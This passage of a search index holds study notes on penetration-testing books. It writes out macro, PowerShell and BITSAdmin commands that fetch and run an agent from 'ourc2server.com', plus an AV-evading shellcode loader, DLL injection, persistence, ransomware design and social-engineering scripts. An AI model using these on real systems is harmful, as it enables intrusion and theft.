and transfer within the hospital during a five - month period .","title":"Analysis Reports"},{"location":"apt/#c2-techniques","text":"Using Trusted Forums to exchange messages","title":"C2 Techniques"},{"location":"apt/#intercepting-syscalls","text":"INS_Delete: Delete a specific instruction INS_RewriteMemmoryOperand: Change memory address by the program PIN_AddSyscallEntryFunction: Intercept syscalls at the entry point PIN_AddSyscallExitFunction: Execute after syscall (usable to alter the result)","title":"Intercepting SYSCalls"},{"location":"apt/#adversary-emulation","text":"Don't wait for maturity to start doing AE Find the gap and then find the tool for that https://github.com/center-for-threat-informed-defense/adversary_emulation_library Start: https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md#step-2---fin6-discovery No need to have full plan in place Detect / Block / Alert Platforms: https://plextrac.com/ FOSS: https://vectr.io/ Thoughts Know the enemy - Frameworks Will drive investment Take as much time as needed Iterate! Fin6","title":"Adversary Emulation"},{"location":"books/","text":"Buy Art of Deception (Wiley, 2002) Chris Hadnagy\u2019s Social Engineering: The Art of Human Hacking (Wiley, 2010). Done Linux Basics for Hackers Getting Started with Networking, Scripting, and Security in Kali In progress Advanced Penetration Testing Hacking the World's Most Secure Networks Take several case studies of APT s and walk the reader through how the attack was done. The Kane incident http://www.securityfocus.com/news/122 BO2K Remote Access Trojans by Cult of the Dead Cow was left to be discovered. Washington University s Medical Center believed that the attack was prevented. A Bug Hunter's Diary (Stop: Ch-4) http://www.trapkit.de/books/bhd/en.html Thought process in finding a VLC buffer overflow (TiVo media file) See Dick Grune and Ceriel J.H. Jacobs, Parsing Techniques: A Practical Guide, 2 nd ed. (New York: Springer Science+Business Media, 2008), 1. Media samples: http://samples.mplayerhq.hu/ David Litchfield, \u201cVariations in Exploit Methods Between Linux and Windows,\u201d 2003 https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf https://www.youtube.com/watch?v=VM1PzvChNv8 Sun Solaris IOCTL related kernel vulnerability First use Null pointer dereference to crash the system EIP is set to 0 value and since 0 is not a valid address, system crashes However, if we map Zero page, it's possible to take control of EIP Then use Zero page to get control over EIP/RIP kernel and the user space of a process share the same zero page: \u201cAttacking the Core: Kernel Exploiting Notes\u201d by twiz sgrakkyu, which can be found at http://www.phrack.com/issues.html?issue=64 id=6 Advanced Penetration Testing Hacking the World's Most Secure Networks APT Capable of developing their own tools Very strong understanding of how modern intrusion detection and prevention systems APT tests involve, whether directly or indirectly, human manipulation. Steps Initial compromise Usually done with social engineering techniques Casting a wide net to catch the low hanging fruit is not an acceptable way to model APTs Establish beachhead Ensure future access to compromised assets without needing a repeat initial intrusion Command Control Escalate privileges Internal reconnaissance Network colonization Persist Complete mission Exfiltrate stolen data Mights about signs: Increase in elevated log-ons late at night Finding widespread backdoor Trojans Unexpected information flows Discovering unexpected data bundles Detecting pass-the-hash hacking tools THE \u201cKANE\u201d INCIDENT Kane was able to stay hidden in the Medical Center networks by allowing his victims to believe they had expelled him Leaving easily discoverable BO2K Remote Access Trojans http://www.securityfocus.com/news/122 Simulating Advanced Persistent Threat Payload Delivery Part 1: Learning How to Use the VBA Macro Microsoft Office (2010 onward) the default behavior of the application is to make no distinction between signed and unsigned code How NOT to: msfvenom - p windows / download_exec - f vba - e shikata - ga - nai - i 5 - a x86 --platform Windows EXE=c:\\temp\\payload.exe URL=http://www.wherever.com functions being imported from kernel32.dll create a process thread allocate memory for the shellcode move the shellcode into that memory lot of virus scanners won\u2019t scan the declaration sec- tion, only the main body of code Instead of Private Declare PtrSafe Function CreateThread Lib kernel32 ( ByVal Zdz As Long , ByVal Tfnsv As Long , ByVal Kyfde As LongPtr , Spjyjr As Long , ByVal Pcxhytlle As Long , Coupxdxe As Long ) As LongPtr Declare Private Declare PtrSafe Function CreateThread Lib kernel32 Alias CTAlias ( ByVal Zdz As Long , ByVal Tfnsv As Long , ByVal Kyfde As LongPtr , Spjyjr As Long , ByVal Pcxhytlle As Long , Coupxdxe As Long ) As LongPtr And use CTAlias in body to bypass some AVs modern antivirus software is capable of passing compiled code (including shellcode) into a micro-virtual machine to test heuristically Do not leave shellcode like structures open Use of one auto-open subroutine is suspicious Sub Auto_Open Main block of code End Sub Sub AutoOpen () Auto_Open End Sub Sub Workbook_Open () Auto_Open End Sub native functions within VBA that allow an attacker to download and execute code from the Internet (these are detected) Shell URLDownLoadToFile Using a VBA/VBS Dual Stager VBA is only ever used within Office documents, VBS is a standalone scripting innocent-looking VBA macro that will carry a VBS payload, write it to file, and execute it Sub WritePayload () Dim PayLoadFile As Integer Dim FilePath As String FilePath = C: \\t emp\\payload.vbs PayloadFile = FreeFile Open FilePath For Output As TextFile Print # PayLoadFile , VBS Script Line 1 Print # PayLoadFile , VBS Script Line 2 Print # PayLoadFile , VBS Script Line 3 Print # PayLoadFile , VBS Script Line 4 Close PayloadFile Shell wscript c: \\t emp\\payload.vbs End Sub Code Obfuscation encode the lines of the payload as Base64 and decode them prior to writing them to the target file XOR function Social engineering imply that information has been sent to them in error it\u2019s something they shouldn\u2019t be seeing Something that would give them an advantage in some way Something that would put them at a disadvantage if they ignored it. Give the end user a compelling reason to enable macros. Tailor the attack to the client Powershell Sub powershell () Powershell Macro Dim PSResponse As String PSResponse = Shell ( PowerShell (New-Object System.Net.WebClient). DownloadFile( http://ourc2server.com/download/c2agent.exe , agent. exe ) ;Start-Process agent.exe , vbHide) End Sub FTP open ourc2server.com binary get /c2agent.exe quit cmd.exe /c @echo open ourc2server.com script.txt @echo binary script.txt @echo get /c2agent.exe script.txt @echo quit script.txt @ftp -s:scrip t.txt -v -A @start c2agent.exe Windows Scripting Host (WSH) strFileURL = http://ourc2server/downloads/c2agent.exe strHDLocation = agent.exe Set objXMLHTTP = CreateObject ( MSXML2.XMLHTTP ) objXMLHTTP . open GET , strFileURL , false objXMLHTTP . send () If objXMLHTTP . Status = 200 Then Set objADOStream = CreateObject ( ADODB.Stream ) objADOStream . Open objADOStream . Type = 1 objADOStream . Write objXMLHTTP . ResponseBody objADOStream . Position = 0 objADOStream . SaveToFile strHDLocation objADOStream . Close Set objADOStream = Nothing End if Set objXMLHTTP = Nothing Set objShell = CreateObject ( WScript.Shell ) objShell . Exec ( agent.exe ) cmd.exe /c @echo Set objXMLHTTP=CreateObject( MSXML2.XMLHTTP ) poc.vbs @echo objXMLHTTP.open GET , http://ourc2server/downloads/c2agent. exe ,false poc.vbs @ echo objXMLHTTP.send() poc.vbs @ echo If objXMLHTTP.Status=200 Then poc.vbs @ echo Set objADOStream=CreateObject( ADODB.Stream ) poc.vbs @ echo objADOStream.Open poc.vbs @ echo objADOStream.Type=1 poc.vbs @ echo objADOStream.Write objXMLHTTP.ResponseBody poc.vbs @ echo objADOStream.Position=0 poc.vbs @ echo objADOStream.SaveToFile agent.exe poc.vbs @ echo objADOStream.Close poc.vbs @ echo Set objADOStream=Nothing poc.vbs @ echo End if poc.vbs @ echo Set objXMLHTTP=Nothing poc.vbs @ echo Set objShell=CreateObject( WScript.Shell ) poc.vbs @ echo objShell.Exec( agent.exe ) poc.vbs cscript.exe poc.vbs BITSadmin: cmd . exe / c bitsadmin /transfer myjob /download /priority high http://ourc2server.com/download/c2agent.exe c:\\agent.exe start agent.exe Base64 encode: PS $b = [System.Text.Encoding] :: UTF8 . GetBytes ( PowerShell (N ew-Object System.Net.WebClient).DownloadFile( http://ourc2server.com/download/c2agent.exe , agent.exe );Start-Process agent.exe ) PS [System.Convert] :: ToBase64String ( $b ) Part 2: Using the Java Applet for Payload Delivery Java Code Signing completely unrealistic security model that lulls users into a false sense of security. Getting a signing cert: Register a domain name that is similar to an existing business Clone and host that website Change all phone contact information Consider a company well outside of the code signer\u2019s normal business area SMTP: https://tools.ietf.org/html/rfc6531 never use the same IPs for mail delivery and C2 Part 3: Physical Media official looking letter giving instructions to the target Target Location Profiling Create a list of ~100 and send a mail. Extract address from reply. installer such as InstallShield or Inno payloads are installed to somewhere they won\u2019t be found and executed, whereas our dummy application should be the thing that draws attention. (install with a desktop icon etc.) also drop the PowerView PowerShell script When hand delivering. Don\u2019t queue. official, appears to come from an official source, and seems mandatory Part 4: Client-Side Exploits 1 Flash exploits Part V: Simulating a Ransomware Attack could just be one component in a larger APT scenario Asymmetric cryptography only libgcrypt gcry_pk_encrypt \u2014Encrypt data using a public key. gcry_pk_decrypt \u2014Decrypt data using a private key. gcry_pk_genkey \u2014Create a new public/private key pair. Remote key generation C2 agent should send a request to the C2 server requesting that a private and a public key pair be generated Public key is then downloaded to the agent Configurable target specific file groups target local/network shares File operations enumerate all drives and scan them for files As each file is encrypted, its name should be added to a list somewhere original file should be destroyed through cryptographic scrubbing. secure-delete hashing and overwriting the file is one example of how this may be achieved encrypted file should be placed in the same directory notify generating a SHA hash of the public key providing that string as a reference when requesting payment ability to export the names of all encrypted files back to the C2 server Part VI: Deploying with HTA HTA Add icon to hta Part VII: USB Shotgun Attack Starting with Windows 7, the OS no longer supports the AutoRun functionality for non-optical removable media. AutoPlay will still work on CDs and DVDs (the user will be given the option to execute the code, but it won\u2019t happen automatically); however, it will no longer work at all for USB drives Part VIII: Miscellaneous Rich Web Content Java Web Start Adobe Air InDesign plugin Create a document and package all dependencies with the document Democratic People\u2019s Republic of Korea (DPRK) Democratic People\u2019s Republic of Korea (DPRK) - Red Star OS No root. Discretionary Access Control (DAC) provided by SE Linux Grant root by: rootsetting Stop SE Linux: setenforce 0 killall - 9 securityd Kill monitoring apps: killall scnprc killall opprc Phone system Needs entry through operator at +850 2 18111 (850 is the country code for DPRK and 2 is Pyongyang) Numbers that can dial internationally cannot dial locally War-dialing. VoIP calling to reduce cost. Record samples. Any tones that fall within a certain frequency we log as modems. Modem responses will contain the following tone DTMFs: 2250hz + 1625hz, 1850hz, 2000hz... WarVOX: https://github.com/rapid7/warvox Grab audio/video from android. If SSL site, permissions are requested only once. Command and Control Part 1: Basics and Essentials Essentials Egress connectivity Stealth fake the timestamp on the executable (show it was there for long time) Svchost.exe and spoolsv.exe make the best targets because there are usually several copies running in memory Remote file system access Remote command execution Secure communications Persistence Windows HKCU \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ Run HKLM \\ Software \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image File Execution Options HKLM \\ Software \\ Wow6432Node \\ Windows NT \\ CurrentVersion \\ Image File Execution Options Services need to be specially compiled as a Windows service drop a DLL instead of an EXE and reference it from a Registry key using rundll32 rundll32 . exe javascript : \\..\\mshtml,RunHTMLApplication ; alert ( Boo! ); largest database of autorun methods: https://technet.microsoft.com/en-gb/sysinternals/bb963902.aspx Linux System V init On Older OSes Debian 6 and earlier Ubuntu 9.04 and earlier CentOS 5 and earlier Bash init script at / etc / init . d / service Then run sudo update - rc . d service enable This create a symlink in the runlevel directories 2 though 5 Add following to /etc/inittab: id : 2345 : respawn :/ bin /sh /path/to/application/s tartup sudo service service stop sudo service service start Upstart OSes Introduced: Ubuntu 6 Default in: Ubuntu 9.10 Red Hat Enterprise 6 Google Chrome OS Ubuntu 9.10 to Ubuntu 14.10 CentOS 6 systemd configuration script in / etc / init called servicename . conf Make sure it contains (runs on boot and will respawn if it dies): start on runlevel [ 2345 ] br respawn Create: / etc / systemd / system / multi - user . target . wants / service . service Should contain: Restart = always under [ Service ] section Start: sudo systemctl enable service . service cron init files /etc/profile /etc/profile.d/*.sh Graphical environments Rootkits: binary on the target system that has been replaced by malicious code yet retains the functionality of the original OSX cron first user-mode app to start is launchd . abusable by: echo bsexec 1 / bin / bash payload . script gt ; / etc / launchd . conf startup items place two items in a subdir within startup dir ( / System / Library / StartupItems or / Library / StartupItems ) StartupParameters . plist must contain Provides key containing name of script file name of the sub-directory must be the same as the name of the script file Port forwarding Control thread C2 Server SSH serving running on TCP port 443 Chroot jail to contain the SSH server Modified SSH configuration to permit remotely forwarded tunnels Payload (use libssh ) Implementation of SSH server on non-standard TCP port (ex: 900) Implementation of SSH client permitting connections back to C2 server Implementation of SSH tunnels (both local and dynamic) over the SSH client permitting C2 access to target file system and processes Part 2: Advanced Attack Management Stealth and Multiple System Management Beaconing : periodically call home (your C2 server) for orders rather than immediately establishing an SSH connection and reverse tunnel Pre-configured command set \u2014An established set of instructions Sleep (~60 seconds) OpenSSHTunnel SSH connection back to the C2 initiate a reverse tunnel allowing C2 to access the target\u2019s file system L22C900 Close SSHTunnel OpenTCPTunnel SSH connection back to the C2 and open a reverse tunnel to any port on the target for accessing local services LxxxCxxx CloseTCPTunnel OpenDynamic SSH connection back to the C2 and open both a dynamic tunnel and a reverse TCP tunnel pointing to it SOCKS5 proxy server CloseDynamic Task Download an executable from the web Tunnel management \u2014The C2 server needs to be able to handle multiple simultaneous inbound connections Web-based frontend Web server: tinyhttpd Scripting language: Python Database: PostgreSQL AJAX IPs, hostnames, etc ports are currently open which hosts they are assigned to function to periodically check the status of open tunnels and mark closed have a way to stack commands Part 3: Advanced Channels and Data Exfiltration ICMP packets were dropped is irrelevant: I can use DNS resolution itself as a means of command and control. dig + trace - using iterative querie sand following the referrals all the way communicate to our C2 via recursive DNS queries 1 st POC - Dan Kaminsky in 2004 with OzymanDNS dnscat2 sudo apt - get install ruby - dev https://github.com/iagox86/dnscat2.git ruby . / dnscat2 . rb anti - virus - update . com modifications to the C source to avoid detection ... listen [ 0000 :] 443 localhost : 443 to create a tunnel between you and remote 443 (then SSH to remote via tunnel) Part V: Creating a Covert C2 Solution Onion Router Routed through several layers of routers Each layer can only see its own upstream and downstream connections in any session and traffic is encrypted If attackers control the exit node, they can see the traffic going to its final destination correlation attacks that can be executed by major players (example NSA) identified by cross-referencing packets entering and leaving the Tor network C2 server can be provisioned as a node within the Tor network compromised host will connect to Tor when it comes online remaining operational access, even if compromised hosts are detected Impl Tor stores its configuration in a file called torrc To create a hidden service: # Configure hidden service directory Hidden ServiceeDir / home / wil / tor_hidden # C2 Web Port HiddenServicePort 443 127 . 0 . 0 . 1 : 4433 # C2 SSH Port HiddenServicePort 7022 127 . 0 . 0 . 1 : 7022 # C2 Metasploit listener HiddenServicePort 8080 127 . 0 . 0 . 1 : 8080 next time Tor is started, two files will be created in the tor_hidden directory private_key file hostname file that contains a hash of the public key address of your C2 Agent bundle the tor.exe (rename first) command-line application with the agent and simply execute it without parameters this will open a SOCKS proxy port on localhost 9050 Tell the SSH SOCKS proxy to upstream to the Tor SOCKS proxy on TCP 9050 Restrictions Some networks may block port TCP 9050 outbound or even dynamically blacklist all Tor nodes Tell C2 agent to use Tor bridges when connecting achieved by adding the following options to the local torrc configuration file (or command line args) Bridge fte 128 . 105 . 214 . 163 : 8080 A17A40775FBD2CA1184BF80BFC330A77ECF9D0E9 Bridge fte 192 . 240 . 101 . 106 : 80 FDC5BA65D93B6BCA5EBDF8EF8E4FA936B7F1F8E5 Bridge fte 128 . 105 . 214 . 162 : 8080 FC562097E1951DCC41B7D7F324D88157119BB56D Bridge fte 50 . 7 . 176 . 114 : 80 2 BD466989944867075E872310EBAD65BC88C8AEF Bridge fte 131 . 252 . 210 . 150 : 8080 0 E858AC201BF0F3FA3C462F64844CBFFC7297A42 Bridge fte 128 . 105 . 214 . 161 : 8080 1 E326AAFB3FCB515015250D8FCCC8E37F91A153B UseBridges 1 Part VI: The Creeper Box Using Raspberry Pi PoE (forensic analysis become hard) 3G/4G adapter ppp sakis3g Configuring Full-Disk Encryption (this involves lot of steps. Ref to book for details) Enable the SSH server change the MAC address (router/switch) configuring a fake Cisco telnet or SSH daemon bridge between between either a switch and a host or a switch and router bridge-utils Using a Pi as a Wireless AP to Provision Access by Remote Keyloggers Label that says \"Do not tamper\"with company logo. Part VII: Advanced Autonomous Data Exfiltration Physical Media Detect removable media Target data to exfiltrate packaged on to the drive Embedded into some pseudo-executable format (HTA) \"Hail Mary\" BlackHat: https://www.youtube.com/watch?v=nuruzFqMgIw USB act like a regular drive. When plugged in during boot, it act as a keyboard and a linux drive. Replace the bootloader with its own. Dropbox to bypass restrictions (Dropbox doesn't do malware checks) Email Use API when possible: example: Outlook API check if a domain has SPF protection (before spoofing) Wifi Connect the laptop via wireless to an AP that you control hidden feature in Windows that allows you to host your own AP while being simultaneously connected to another one with the same adapter (Internet Connection Sharing) netsh wlan set hostednetwork mode = allow ssid = C2backdoor key = password net start SharedAccess Mobile data / Bluetooth / SMS Dongle stealth installs the 3G/4G drivers silent install: setup_vmb . exe s / L2057 / v OPCO_PROP=23415 /qn /norestart establishes C2 (talk about adding a label that says: SIPDIS means it\u2019s for SIPRNet distribution and NOFORN means No Foreign Nationals ) Reciever will plug it to SIPRNet workstation to know what's inside Part VIII: Experimental Concepts in Command and Control C2 Server Guided Agent Management allow the C2 server to assign roles to the C2 agents one becomes master, others send data to master (master repaly to C2) have timeout and failover mechanisum HTTPS is not recommended for carrying C2 data outside the network Due to border level security May use ICMP, SNMP, fake RIP and OSPF messages Semi-Autonomous C2 Agent Management broadcast packet or a fake ARP packet can be used to enable nodes that are not aware of each other\u2019s presence elect a master The host with the most points becomes the new master points: Relative importance of the node (DC) Previous reliability of the node as noted by uptime Communication reliability in general (score decrease with every failure) Random jitter to avoid stagnation master responsible of monitoring slaves motify c2 if slave goes offline central conduit between the C2 server and the C2 slave nodes Correctly routing C2 messages to C2 slave nodes (c2 only say slave ID) should not be used for initiating a new election (that is reponsibility of all) The Attack Bypassing Authentication browser pivoting - transparently exploit his or her permissions DLL Injection - Inject code into the IE process migrate code between processes is a core skill in APT modeling process of inserting code into an existing (running) process use the LoadLibraryA () function in kernel32 . dll this function will register our DLL with the target process big antivirus no-no Better approach: Attach to the target process (in this case Internet Explorer). hHandle = OpenProcess ( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | Allocate memory within the target process. PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ , FALSE , procID ); GetFullPathName ( TEXT ( proxy.dll ), BUFSIZE , dllPath , NULL ); hFile = CreateFileA ( dllPath , GENERIC_READ , 0 , NULL , OPEN_EXISTING , FILE_ATTRIBUTE_NORMAL , NULL ); dllFileLength = GetFileSize ( hFile , NULL ); remoteDllAddr = VirtualAllocEx ( hProcess , NULL , dllFileLength , MEM_RESERVE | MEM_COMMIT , PAGE_EXECUTE_READWRITE ); Copy the DLL into the target process memory and calculate an appropriate memory addresses. lpBuffer = HeapAlloc ( GetProcessHeap (), 0 , dllFileLength ); ReadFile ( hFile , lpBuffer , dllFileLength , dwBytesRead , NULL ); WriteProcessMemory ( hProcess , lpRemoteLibraryBuffer , lpBuffer , dllFileLength , NULL ); dwReflectiveLoaderOffset = GetReflectiveLoaderOffset ( lpWriteBuff ); Instruct the target process to execute your DLL. rThread = CreateRemoteThread ( hTargetProcHandle , NULL , 0 , lpStartExecAddr , lpExecParam , 0 , NULL ); WaitForSingleObject ( rThread , INFINITE ); Create a web proxy Dynamic Link Library (DLL) based on the Microsoft WinInet API Internet Explorer uses the WinInet API exclusively for communication Inject proxy to intercept and read session finroamtion Pass web traffic through our SSH tunnel and the newly created proxy Situational Awareness ascertain exactly where you are in a target\u2019s network what privileges you have https://github.com/PowerShellEmpire/PowerTools : collection of PowerShell projects with a focus on offensive operations PowerView, can be used to query the AD in a number of ways c : powershell . exe - nop - exec bypass PS c : import - module .\\ powerview . ps1 PS c : Get - NetDomain | Out - File - Encoding ascii domains . txt PS c : Get - NetComputer - FullData | Out - File - encoding ascii machines . txt PS c : Get - NetUser - FullData | Out - File - encoding ascii users . txt FortiGate OS Version 4.8 sqlcmd - s medlab03 - SQL - u coll - domain / dgammon - p ILoveJustinBieber - q exec sp_databases sqlcmd - s medlab03 - SQL - u coll - domain / dgammon - p ILoveJustinBieber - Q BACKUP DATABASE perfuse_db TO DISK= C:\\perfuse_db.bak Get IPs of hosts: foreach ( $ computer in ( get - content C : \\ hosts . txt )) { Try { [ system . net . Dns ]:: GetHostAddresses ( $ computer ) | Foreach - Object { add - content - path C : \\ hosts - ips . txt - value $($_.IPAddressToString) } } Catch { } } Migration Process Checking if the meterpreter process has the SeDebugPrivilege Getting payload from the handler Calculating its length Calling the OpenProcess () API to gain access to the virtual memory of the target process. Calling the VirtualAllocEx () API to allocate an RWX (Read, Write, Execute) memory in the target process. Calling the WriteProcessMemory () API to write the payload in the target memory virtual memory space. Calling the CreateRemoteThread () API to execute the newly created memory stub having the injected payload in a new thread. Terminating the initial Meterpreter process. Uses migrate into the lsass . exe process and dump cached hashes without touching the disk Windows logon credentials, you must first inject into the winlogon . exe process After compromise Check if a domain-admin has signed into a machine where you have local-admin access to: PowerView Invoke - StealthUserhunter - GroupName Domain Admins Impersonate domain admin: meterpreter use incognito meterpreter getuid meterpreter list_tokens - u meterpreter impersonate_token PHARMA \\ globaladmin Search for files: dir \\\\ hostname \\ c $\\ * . xl * / s / b Personal Storage Table (. pst ) Offline Stored Table (. ost ) WMIC installer, which will allow us to invisibly deploy software remotely without any further user interaction: wmic / node :: @ c:\\computers.txt product call install true , , c:\\ PathToYour\\File.msi Credentials Decrypting the credential store copy the encrypted hashes re-create the login file or Registry entries locally let you access the applications they are intended to secure use a network sniffer (such as Wireshark) on your own machine to see the password transmitted in the clear Keyloggers and Cookies delete the cookies and force the users to log in: RunDll32 . exe InetCpl . cpl , ClearMyTracksByProcess 2 Chrome: Delete relevant file in: C : \\ Users \\ lt ; username gt ; \\ AppData \\ Local \\ Google \\ Chrome \\ User Data Windows Previlege Escalation Local exploit wmic qfe get Caption , Description , HotFixID , InstalledOn wmic qfe get Caption , Description , HotFixID , InstalledOn | findstr / C : KB2393802 https://github.com/GDSSecurity/Windows-Exploit-Suggester.git Flawed installation method sysprep . inf sysprep . xml unattended . xml Scheduled tasks schtasks / query / fo LIST / v schtasks / create / tn TaskName / tr TaskRun / sc onstart schtasks / create / tn TaskName / tr TaskRun / sc onlogon schtasks / create / tn TaskName / tr TaskRun / sc onidle / i { 1 - 999 } schtasks / create / tn TaskName / tr TaskRun / sc once / st HH : MM schtasks / create / tn TaskName / tr TaskRun / sc onlogon / ru System runs with system permissions schtasks / create / tn TaskName / tr TaskRun / sc onlogon / s PC_Name runs on a remote computer Vulnerable services net start sc qc VulnService accesschk . exe - ucqv VulnService sc config VulnPath binpath = C:\\temp\\c2agent.exe sc config VulnPath obj = .\\LocalSystem password = DLL hijacking DLL is loaded into the process space of the program calling it (becomes part of that program) DLL has no execution permissions of its own inherits permissions from the executable that imports it Recon: Which processes will load with elevated privileges Which DLLs you can overwrite with the privileges you have What DLLs are being imported by any given process Workflow: search processes: tasklist . exe / FI username eq system / v Dependency Walker to identify DLLs used icacls mmfs2 . dll to check permissions craft DLL (c++) #include windows.h #include stdio.h BOOL WINAPI DllMain ( HINSTANCE hinstDLL , DWORD fdwReason , LPVOID lpReserved ) { printf ( This string will be written to the console when this DLL is imported \\n ); break ; } Registry checks AlwaysInstallElevated CallerID VoIP vendors that allow outbound calling globally for low rates critically\u2014the option to set your own Caller ID and SMS number (CallWithUs) Detection and the Security Operations Center IDS Network Intrusion Detection System (NIDS) passive sniffing interfaces data directly from the switch (span, tap, or mirror port) don\u2019t hose network\u2019s core bandwidth Host-based Intrusion Detection System (HIDS) problems on end-points file integrity monitoring, rootkit checks, and Windows Registry checks. IDS monitors network traffic for malicious behavior, system log messages, and user activity. IDS Evasion AlienVault trial can be used to test understand its OTX (Open Threat eXchange) integration EventRisk = ( AssetValue \u00d7 EventPriority \u00d7 EventReliability ) / 25 asset with a low value and priority with a rule that is not considered to be sufficiently reliable is not going to get flagged aim to compromise endpoints that are going to have the lowest asset value (printer) Cisco router will likely be considered a high-value asset but monitoring usually has to be carefully tuned to avoid excess false positives A light port scan coming from a Cisco device will likely not be flagged or be immediately closed by the SOC team TCL scripting language in Cisco devices can be used to script an attack Security Operations Center (SOC) these are the people you have to beat in an APT modeling exercise Team: Shift manager \u2014 Responsible for handovers between shifts and associated duties (briefing status) First line SOC analysts \u2014 Working in shifts 24/7 monitoring the SIEM attack is detected, a ticket is raised and passed to the second line analysts Second line SOC analysts \u2014 Also available 24/7, although not necessarily on site determine if the ticket is a false positive or needs to be escalated to the third line analysts Third line SOC analysts \u2014 Technically available 24/7 depending on the nature of the incident serious ongoing security incident or \u201cactive shooter\u201d scenario final hour of a shift change in the early hours of the morning (3-4am) will likely be the time when the SOC reaction time is at its slowest Disrupt: Stage an attack on a different part Vulnerability scanners and brute force authentication attacks from multiple IPs Aim to put as many tickets between you and your attack AV Evading x86/shikata_ga_nai and XORing it with a simple key and use loader: #include windows.h #include iostream int main ( int argc , char ** argv ) { char b [] = { /* your XORd with key of xyz shellcode goes here*/ }; char c [ sizeof b ]; for ( int i = 0 ; i sizeof b ; i ++ ) { c [ i ] = b [ i ] ^ x ;} void * exec = VirtualAlloc ( 0 , sizeof c , MEM_COMMIT , PAGE_EXECUTE_ READWRITE ); memcpy ( exec , c , sizeof c ); (( void ( * )()) exec )(); } In agent code don't use words like Base64Decode (book uses monkey instead) Veil Evasion Social Engineering Fuzzy Fact (hand writing of name is not clesr, hence ask for help) Psychic Credit credit them with knowledge or experience they don\u2019t have treating the target as an equal and according them the respect of a peer \"I\u2019m normally not used to dealing with people who know what they\u2019re talking about\u2014this is a nice change!\" \"You\u2019re the expert so I was wondering if you could tell me....\" The Rainbow Ruse statement that credits the client with both a personality trait and its opposite irrefutable statement and that\u2019s social engineering gold Flattery / praising the concern / similar to the psychic credit, but is broader in its approach (\u201cYou\u2019re warm and loving.\u201d) \u201cI have to say I think your adherence to the essence of what security really is is spot on. Getting the balance right between functional process and security is never easy, but I think you\u2019ve really judged it well\u2014probably a bit better than most companies in your sector. At least in my experience.\u201d The Jacques Statement The Barnum Statement \u201csomething to please everybody.\u201d Statement is one that is designed to ring true to everyone Threat Modeling Designing for Security Threat modeling is the use of abstractions to aid in thinking about risks. Without threat models, you can never stop playing whack-a-mole Threat modeling should focus on issues that other techniques can\u2019t find \u201cThink Like an Attacker\u201d Considered Harmful thinking like a professional chef: Even if you\u2019re a great home cook, a restaurant-managing chef has to wrestle with problems that a home cook does not. you may end up with implicit or incorrect assumptions about how an attacker will think may lead you to focus on the wrong threats Reasons to Threat Model Find Security Bugs Early Understand Your Security Requirements Engineer and Deliver Better Products Address Issues Other Techniques Won\u2019t errors of omission (no code analysis tool will find) issues unique to your design Four step framework Model System - What are you building? Show trust boundaries Accounts (UIDs on unix systems, or SIDS on Windows) Network interfaces Different physical computers Virtual machines Organizational boundaries Almost anywhere you can argue for different privileges Find Threats - What can go wrong with it once it\u2019s built? Spoofing - pretending to be something or someone you\u2019re not. Someone might pretend to be another customer - authenticate users Someone might also pretend to be your website - SSL certificate and single domain Tampering - modifying something you\u2019re not supposed to modify. Data tampering at backend Data tampering during transit Someone deploy code thinking it's dev-env Angry programmer adding a discount code Repudiation - claiming you didn\u2019t do something (regardless of whether you did or not). Logs and log tampering prevention Information Disclosure - exposing information to people who are not authorized to see it. Can anyone connect to DB What happens if someone connect to DB Denial of Service - attacks designed to prevent a system from providing service What happens if 1000s of request come at same time Elevation of Privilege - program or user is able to do things that they\u2019re not supposed to do. What prevents users from connecting directly to the backend What controls access to DB Address Threats - What should you do about those things that can go wrong? Mitigating threats - doing things to make it harder to take advantage of a threat Eliminating threats - almost always achieved by eliminating features Transferring threats - letting someone or something else handle the risk Accepting the risk Validate - Did you do a decent job of analysis? Identifying Threats Start with external entities Never ignore a threat because it\u2019s not what you\u2019re looking for right now Focus on feasible threats","title":"Books"},{"location":"books/#buy","text":"Art of Deception (Wiley, 2002) Chris Hadnagy\u2019s Social Engineering: The Art of Human Hacking (Wiley, 2010).","title":"Buy"},{"location":"books/#done","text":"Linux Basics for Hackers Getting Started with Networking, Scripting, and Security in Kali","title":"Done"},{"location":"books/#in-progress","text":"","title":"In progress"},{"location":"books/#advanced-penetration-testing-hacking-the-worlds-most-secure-networks","text":"Take several case studies of APT s and walk the reader through how the attack was done. The Kane incident http://www.securityfocus.com/news/122 BO2K Remote Access Trojans by Cult of the Dead Cow was left to be discovered. Washington University s Medical Center believed that the attack was prevented.","title":"Advanced Penetration Testing Hacking the World's Most Secure Networks"},{"location":"books/#a-bug-hunters-diary-stop-ch-4","text":"http://www.trapkit.de/books/bhd/en.html Thought process in finding a VLC buffer overflow (TiVo media file) See Dick Grune and Ceriel J.H. Jacobs, Parsing Techniques: A Practical Guide, 2 nd ed. (New York: Springer Science+Business Media, 2008), 1. Media samples: http://samples.mplayerhq.hu/ David Litchfield, \u201cVariations in Exploit Methods Between Linux and Windows,\u201d 2003 https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf https://www.youtube.com/watch?v=VM1PzvChNv8 Sun Solaris IOCTL related kernel vulnerability First use Null pointer dereference to crash the system EIP is set to 0 value and since 0 is not a valid address, system crashes However, if we map Zero page, it's possible to take control of EIP Then use Zero page to get control over EIP/RIP kernel and the user space of a process share the same zero page: \u201cAttacking the Core: Kernel Exploiting Notes\u201d by twiz sgrakkyu, which can be found at http://www.phrack.com/issues.html?issue=64 id=6","title":"A Bug Hunter's Diary (Stop: Ch-4)"},{"location":"books/#advanced-penetration-testing-hacking-the-worlds-most-secure-networks_1","text":"APT Capable of developing their own tools Very strong understanding of how modern intrusion detection and prevention systems APT tests involve, whether directly or indirectly, human manipulation. Steps Initial compromise Usually done with social engineering techniques Casting a wide net to catch the low hanging fruit is not an acceptable way to model APTs Establish beachhead Ensure future access to compromised assets without needing a repeat initial intrusion Command Control Escalate privileges Internal reconnaissance Network colonization Persist Complete mission Exfiltrate stolen data Mights about signs: Increase in elevated log-ons late at night Finding widespread backdoor Trojans Unexpected information flows Discovering unexpected data bundles Detecting pass-the-hash hacking tools THE \u201cKANE\u201d INCIDENT Kane was able to stay hidden in the Medical Center networks by allowing his victims to believe they had expelled him Leaving easily discoverable BO2K 